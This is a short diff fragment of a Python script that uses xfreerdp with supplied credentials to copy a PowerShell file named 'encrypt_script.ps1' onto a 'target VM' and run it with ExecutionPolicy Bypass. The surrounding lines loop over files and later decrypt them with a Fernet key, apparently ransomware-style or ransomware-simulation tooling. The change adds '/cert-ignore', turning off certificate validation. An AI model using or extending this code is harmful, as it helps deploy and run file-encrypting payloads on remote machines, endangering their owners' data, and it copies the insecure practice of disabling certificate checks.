@@ -37,12 +37,14 @@ foreach ($file in $files) {{
         script_name = "encrypt_script.ps1"
 
         # Copy the script file to the target VM using RDP (xfreerdp)
-        copy_script_command = f'xfreerdp /u:{rdp_username} /p:{rdp_password} /v:{target_vm_ip} /d: /app:"powershell -ExecutionPolicy Bypass -Command \\"$scriptContent = \\"{script_content}\\"; $scriptContent | Out-File -FilePath \\"{script_name}\\" -Encoding UTF8\\""'
+        # Copy the script file to the target VM using RDP (xfreerdp) with certificate validation disabled
+        copy_script_command = f'xfreerdp /u:{rdp_username} /p:{rdp_password} /v:{target_vm_ip} /d: /app:"powershell -ExecutionPolicy Bypass -Command \\"$scriptContent = \\"{script_content}\\"; $scriptContent | Out-File -FilePath \\"{script_name}\\" -Encoding UTF8\\"" /cert-ignore'
         subprocess.Popen(copy_script_command, shell=True)
-
-        # Run the script on the target VM using RDP (xfreerdp)
-        run_script_command = f'xfreerdp /u:{rdp_username} /p:{rdp_password} /v:{target_vm_ip} /d: /app:"powershell -ExecutionPolicy Bypass -File \\"{script_name}\\""'
+        
+        # Run the script on the target VM using RDP (xfreerdp) with certificate validation disabled
+        run_script_command = f'xfreerdp /u:{rdp_username} /p:{rdp_password} /v:{target_vm_ip} /d: /app:"powershell -ExecutionPolicy Bypass -File \\"{script_name}\\"" /cert-ignore'
         subprocess.Popen(run_script_command, shell=True)
+
 
 
     # Decrypt files using the Fernet symmetric key
